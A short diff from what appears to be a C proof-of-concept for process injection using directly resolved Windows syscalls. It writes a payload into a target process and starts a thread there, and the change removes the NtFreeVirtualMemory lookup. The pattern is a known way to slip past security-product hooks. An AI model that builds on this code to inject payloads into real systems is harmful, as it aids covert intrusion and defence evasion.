@@ -96,7 +96,6 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	ULONG SysNtWriteVirtualMemory = GetSysCallNumber("NtWriteVirtualMemory");
 	ULONG SysNtProtectVirtualMemory = GetSysCallNumber("NtProtectVirtualMemory");
 	ULONG SysNtCreateThreadEx = GetSysCallNumber("NtCreateThreadEx");
-	ULONG SysNtFreeVirtualMemory = GetSysCallNumber("NtFreeVirtualMemory");
 
 
 	// Todo: encode syscall numbers
@@ -112,7 +111,6 @@ void VectoredSyscalPOC(unsigned char payload[], SIZE_T payload_size, int pid) {
 	_NtWriteVirtualMemory pNtWriteVirtualMemory = (_NtWriteVirtualMemory)SysNtWriteVirtualMemory;
 	_NtProtectVirtualMemory pNtProtectVirtualMemory = (_NtProtectVirtualMemory)SysNtProtectVirtualMemory;
 	_NtCreateThreadEx pNtCreateThreadEx = (_NtCreateThreadEx)SysNtCreateThreadEx;
-	_NtFreeVirtualMemory pNtFreeVirtualMemory = (_NtFreeVirtualMemory)SysNtFreeVirtualMemory;
 
 	HANDLE hProcess = { INVALID_HANDLE_VALUE };
 	HANDLE hThread = NULL;
